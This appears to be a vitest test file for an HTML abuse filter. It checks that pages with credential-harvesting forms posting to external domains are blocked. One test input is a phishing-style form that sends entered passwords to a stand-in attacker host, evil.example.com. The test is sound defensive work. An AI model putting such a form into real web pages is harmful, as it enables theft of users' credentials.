import { describe, it, expect } from "vitest";
import { checkHtmlForAbuse } from "../src/abuse-filter";

describe("abuse filter", () => {
  it("allows a plain page with no forms", () => {
    expect(checkHtmlForAbuse("<html><body>Hello</body></html>")).toEqual({
      blocked: false,
    });
  });

  it("blocks a form posting to an external domain alongside credential-harvesting language", () => {
    const html = `<form action="https://evil.example.com/collect"><p>Enter your password to continue</p></form>`;
    const result = checkHtmlForAbuse(html);
    expect(result.blocked).toBe(true);
    expect(result.reason).toMatch(/external/i);
  });

  it("allows a form posting to a relative path even if it mentions a password", () => {
    const html = `<form action="/submit"><p>password</p></form>`;
    expect(checkHtmlForAbuse(html)).toEqual({ blocked: false });
  });
});
